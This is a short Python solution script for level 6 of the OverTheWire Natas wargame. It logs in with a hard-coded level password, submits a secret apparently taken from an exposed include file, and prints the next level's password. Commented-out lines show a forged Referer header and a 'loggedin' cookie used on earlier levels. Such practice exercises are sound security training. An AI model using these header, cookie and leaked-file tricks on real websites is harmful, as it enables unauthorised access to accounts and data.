#! /usr/bin/env python3.6
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#
# Distributed under terms of the %LICENSE% license.

"""
A script to use in Natas Wargame room in OvertheWire
"""

import re
import requests

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

# headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
# cookies = {"loggedin": "1"}

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url+"index-source.html",auth=(username, password))
# response = session.get(url+"includes/secret.inc", auth=(username, password))
# response = session.post(url, auth=(username, password), cookies=cookies)

response = session.post(url, data={"secret": "FOEIUWGHFEEUHOFUOIU", "submit":
                                   "submit"}, auth=(username, password))
# response = session.get(url, auth=(username, password), cookies=cookies)

content = response.text
# print(content)

# print(session.cookies)

print(re.findall('The password for natas7 is (.*)', content)[0])
